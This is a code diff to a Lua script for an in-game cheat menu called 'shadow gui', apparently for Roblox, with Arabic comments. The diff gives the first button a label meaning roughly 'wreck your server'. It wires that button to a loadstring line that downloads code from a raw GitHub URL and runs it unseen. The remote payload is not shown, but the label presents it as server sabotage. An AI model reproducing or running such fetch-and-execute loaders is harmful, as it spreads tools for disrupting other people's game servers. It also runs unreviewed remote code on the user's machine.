@@ -58,9 +58,9 @@ local MENU_TITLE   = "shadow gui"
 
 -- غيّر اسم كل زر وحط السكربت حقك داخل function
 local BUTTONS = {
-	{ Name = "", Callback = function()
+	{ Name = "خرب سيرفرك", Callback = function()
 		print("الزر 1")
-		-- حط سكربتك هنا
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aliazayduazaydu-cpu/Idk/refs/heads/main/Gg"))()
 	end },
 	{ Name = "الزر 2", Callback = function()
 		print("الزر 2")
